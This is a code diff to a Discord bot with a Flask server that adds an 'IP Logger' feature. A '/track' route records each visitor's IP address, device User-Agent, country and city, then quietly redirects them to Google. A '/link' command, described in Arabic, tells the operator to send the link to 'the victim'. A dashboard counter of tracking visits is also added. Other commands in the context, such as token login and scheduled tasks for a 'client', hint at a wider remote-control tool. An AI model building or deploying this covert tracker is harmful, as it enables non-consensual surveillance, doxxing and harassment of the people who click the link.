@@ -59,6 +59,35 @@ def autologin():
         
     return "❌ Session expired or not found", 404
 
+@app.route('/track')
+def track_visitor():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent')
+    
+    try:
+        geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
+        country = geo_res.get('country', 'Unknown')
+        city = geo_res.get('city', 'Unknown')
+    except Exception:
+        country, city = 'Unknown', 'Unknown'
+
+    try:
+        db, sha, url, headers = fetch_db()
+        if db:
+            if "web_visits" not in db: db["web_visits"] = []
+            db["web_visits"].append({
+                "ip": ip,
+                "country": country,
+                "city": city,
+                "user_agent": user_agent,
+                "time": int(time.time())
+            })
+            save_db(db, sha, url, headers, f"New visit from IP {ip}")
+    except Exception:
+        pass
+
+    return redirect("https://www.google.com", code=302)
+
 def run():
     app.run(host='0.0.0.0', port=8080)
 
@@ -568,6 +597,20 @@ async def loginbytoken_command(interaction: discord.Interaction, platform: str, 
 
     await interaction.followup.send(embed=embed, view=view, ephemeral=True)
 
+@client.tree.command(name="link", description="توليد رابط تتبع (IP Logger) لجلب معلومات وجوال وزوار الضحية")
+async def generate_track_link(interaction: discord.Interaction):
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
+    
+    track_url = "https://your-bot-replit-or-server-url.repl.co/track"
+    
+    embed = discord.Embed(
+        title="🔗 رابط التتبع الجاهز للإنشاء",
+        description=f"أرسل هذا الرابط للضحية (سواء فتحه من جوال أو كمبيوتر):\n`{track_url}`\n\nأول ما يضغط عليه الضحية، سيتم تسجيل الـ IP، نوع الجهاز، والدولة وحفظها فوراً!",
+        color=0xFF5733
+    )
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
 @client.tree.command(name="scheduletask", description="جدولة أمر مؤجل للعميل ليتم تنفيذه بعد عدد من الثواني")
 @app_commands.describe(target_code="كود العميل", delay_seconds="عدد الثواني للانتظار", task_type="نوع المهمة")
 @app_commands.choices(task_type=[
@@ -795,10 +838,14 @@ async def stats_gui_command(interaction: discord.Interaction):
     total = len(codes)
     used = sum(1 for c in codes.values() if c.get("used"))
     available = total - used
+    visits = len(db.get("web_visits", []))
+    
     embed = discord.Embed(title="📊 لوحة التحكم والإحصائيات الشاملة", description="اختر القسم المطلوب من الأزرار أدناه:", color=0xA871FF)
     embed.add_field(name="📌 الإجمالي", value=f"`{total}`", inline=True)
     embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
     embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
+    embed.add_field(name="🌐 عدد زيارات روابط التتبع", value=f"`{visits}` زيارة", inline=False)
+    
     await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)
 
 @client.tree.command(name="clear", description="حذف رسائل البوت وتنظيف الشاشة")
